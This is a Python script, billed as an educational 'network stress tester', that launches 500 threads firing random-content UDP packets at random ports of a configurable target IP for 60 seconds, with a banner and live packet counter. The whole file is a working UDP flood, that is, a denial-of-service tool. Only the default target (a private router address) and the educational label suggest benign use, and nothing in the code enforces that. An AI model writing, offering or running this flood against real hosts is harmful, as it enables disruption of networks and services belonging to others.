import socket
import threading
import time
import os
import random
import sys

# ==========================================
#           NETWORK STRESS TESTER
#       Created for Educational Purposes
# ==========================================

# ANSI Color Codes for Terminal
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Configuration
TARGET_IP = "192.168.1.1"  # Your Router IP
DURATION = 60              # Attack duration in seconds
THREADS = 500              # Number of threads
PACKET_SIZE = 1472         # Max UDP Payload

# Global Variables
running = True
packets_sent = 0

def display_banner():
    os.system('clear')
    banner = f"""{RED}{BOLD}
    ███╗   ██╗███████╗████████╗    ██╗      █████╗  ██████╗ 
    ████╗  ██║██╔════╝╚══██╔══╝    ██║     ██╔══██╗██╔════╝ 
    ██╔██╗ ██║█████╗     ██║       ██║     ███████║██║  ███╗
    ██║╚██╗██║██╔══╝     ██║       ██║     ██╔══██║██║   ██║
    ██║ ╚████║███████╗   ██║       ███████╗██║  ██║╚██████╔╝
    ╚═╝  ╚═══╝╚══════╝   ╚═╝       ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
    {YELLOW}          [ Network Bandwidth Stress Tester v1.0 ]{RESET}
    {CYAN}            Test your own network security safely{RESET}
    """
    print(banner)
    print(f"{GREEN}[+]{RESET} Target Gateway : {YELLOW}{TARGET_IP}{RESET}")
    print(f"{GREEN}[+]{RESET} Threads        : {YELLOW}{THREADS}{RESET}")
    print(f"{GREEN}[+]{RESET} Duration       : {YELLOW}{DURATION}s{RESET}")
    print(f"{GREEN}[+]{RESET} Status         : {RED}INITIATING STRESS TEST...{RESET}\n")

def flood():
    global running, packets_sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while running:
        try:
            port = random.randint(1, 65535)
            data = os.urandom(PACKET_SIZE) 
            sock.sendto(data, (TARGET_IP, port))
            packets_sent += 1
        except Exception:
            pass

def stats_tracker():
    global running, packets_sent
    while running:
        time.sleep(1)
        # \r is used to overwrite the same line for a live counter effect
        sys.stdout.write(f"\r{CYAN}[>] Packets Sent: {YELLOW}{packets_sent}{CYAN} | Target: {RED}{TARGET_IP}{RESET}       ")
        sys.stdout.flush()
        packets_sent = 0

def timer():
    global running
    time.sleep(DURATION)
    running = False
    print(f"\n\n{GREEN}[!] Time limit reached. Stopping test...{RESET}")
    os._exit(0)

if __name__ == "__main__":
    display_banner()
    
    # Start Timer
    t_timer = threading.Thread(target=timer)
    t_timer.daemon = True
    t_timer.start()
    
    # Start Stats Tracker
    t_stats = threading.Thread(target=stats_tracker)
    t_stats.daemon = True
    t_stats.start()

    # Start Flood Threads
    for i in range(THREADS):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()

    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n\n{RED}[-] Test aborted by user.{RESET}")
        os._exit(0)
